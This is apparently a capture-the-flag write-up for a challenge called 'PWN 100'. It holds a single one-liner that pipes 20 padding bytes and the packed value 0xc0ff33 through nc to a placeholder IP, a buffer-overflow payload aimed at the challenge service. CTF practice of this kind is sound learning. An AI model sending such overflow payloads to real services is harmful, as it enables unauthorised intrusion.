# PWN 100 Solution

```
python -c "from struct import *; print('B'*20 + pack('<L', 0xc0ff33))" | nc <IP> 10001
```
